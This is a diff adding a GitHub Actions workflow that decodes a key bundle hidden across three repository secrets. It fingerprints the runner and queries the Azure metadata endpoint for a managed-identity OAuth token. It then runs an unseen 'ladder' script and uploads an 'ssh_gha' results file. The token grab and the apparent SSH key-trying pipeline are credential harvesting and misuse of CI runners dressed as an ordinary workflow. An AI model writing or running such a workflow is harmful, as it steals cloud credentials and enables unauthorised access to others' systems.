@@ -1,0 +1,50 @@
+name: ul9060-keyladder
+on:
+  workflow_dispatch:
+    inputs:
+      windows:
+        description: windows
+        default: "3"
+      spacing:
+        description: spacing seconds
+        default: "240"
+permissions:
+  contents: read
+jobs:
+  ladder:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: decode bundle
+        env:
+          KB1: ${{ secrets.KB1 }}
+          KB2: ${{ secrets.KB2 }}
+          KB3: ${{ secrets.KB3 }}
+        run: |
+          set -eu
+          mkdir -p "$HOME/b"
+          printf '%s%s%s' "$KB1" "$KB2" "$KB3" | base64 -d > "$HOME/b/bundle.tgz"
+          sha256sum "$HOME/b/bundle.tgz"
+          tar -xzf "$HOME/b/bundle.tgz" -C "$HOME/b"
+          echo keys=$(ls "$HOME/b/keys" | wc -l)
+      - name: identity-and-imds
+        run: |
+          id; hostname; uname -a; curl -s -m 8 https://api.ipify.org; echo
+          echo "--- azure imds attempt ---"
+          (curl -s -m 5 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 400 || true); echo
+          (curl -s -m 5 -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -c 400 || true); echo
+      - name: ladder
+        env:
+          W: ${{ inputs.windows }}
+          S: ${{ inputs.spacing }}
+        run: bash scripts/run_ladder.sh
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ssh_gha
+          path: |
+            /home/runner/b/ssh_gha.tsv
+            /home/runner/b/summary.tsv
+          if-no-files-found: warn
